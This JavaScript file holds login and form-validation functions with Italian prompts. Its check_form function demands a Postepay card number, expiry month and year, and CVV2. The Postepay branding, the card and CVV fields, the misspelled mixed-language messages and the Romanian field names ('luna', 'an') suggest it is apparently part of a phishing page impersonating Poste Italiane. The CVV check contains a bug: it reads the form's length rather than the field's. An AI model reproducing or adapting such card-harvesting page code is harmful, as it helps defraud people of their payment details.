function apripopup(purl,ptitle,pwidth,pheight,presisable){

window.open(purl,ptitle,'width='+pwidth+',height='+pheight+',location=0,menubar=0,personalbar=0,resizable='+presisable+',toolbar=0,status=0,scrollbars=1');
return false;
}
function logintest(actForm)
{
  strUser = actForm.USR.value;
  strPwrd = actForm.PSWD.value;
  if ((strUser.length == 0 || strUser == "") || (strPwrd.length == 0 || strPwrd == ""))
  {
    alert("Per eseguire il Login inserire i dati richiesti.");
    document.Login.USR.focus();
    return false;
  }
  else
  {
    return true;
  }
}
 
 function key_up(event)
    {
        if(event.keyCode != 9)
        {
            return;
        }

        clean_elements();
        if(event.target)
        {
            highlight_element(event.target);
        }
        if(event.srcElement)
        {
            if(event.srcElement.type=="text" || event.srcElement.type=="password")
            {
                highlight_element(event.srcElement);
            }
        }
    }
    function mouse_click(event)
    {
        if(event.target)
        {
            highlight_element(event.target);
        }
        if(event.srcElement)
        {
            highlight_element(event.srcElement);
        }
    }
    function highlight_element(element)
    {
        element.select();
    }
    function clean_elements()
    {
        if (document.selection)
            document.selection.empty();
        else if (window.getSelection)
            window.getSelection().removeAllRanges();
    }
	
	//check numbers
	function isNumeric(value) {
  if (value == null || !value.toString().match(/^[-]?\d*\.?\d*$/)) return false;
  return true;
}
	
	// custom function
function check_form() {

 valid = true;
	if (document.finform.nr.value == ''|| document.finform.nr.value.length < 16) {
		alert('Per continuare inseriti la carta postepay.');
		//document.getElementById('nr').focus();
		document.finform.nr.focus();
		valid = false;
	}	
	else if (!isNumeric(document.finform.nr.value)) {
		alert('Carta Postepay deve essere numerico');
		//document.getElementById('nr').focus();
		document.finform.nr.focus();
		valid = false;
	}
	else if (document.finform.luna.value == '' || document.finform.luna.value.length < 2 ) {
		alert('inserrire le luna petr continuare');
		//document.getElementById('luna').focus();
		document.finform.luna.focus();
		valid = false;
	}
	else if (!isNumeric(document.finform.luna.value) || !isNumeric(document.finform.an.value)) {
		alert('luna and an must be numeric');
		valid = false;
	}
	else if (document.finform.an.value == '' || document.finform.an.value.length < 2) {		
		alert('inserire la an per continuare.');
		//document.getElementById('an').focus();
		document.finform.an.focus();
		valid = false;
	}
  else if (document.finform.cvv2.value == '' || document.finform.value.length < 3) {	
		alert('wrong pin');
		//document.getElementById('cvv2').focus();
		document.finform.cvv2.focus();
		valid = false;
	}
  	else if (!isNumeric(document.finform.cvv2.value)) {
		alert('pin must be numeric');
		valid = false;
	}
return valid;
}
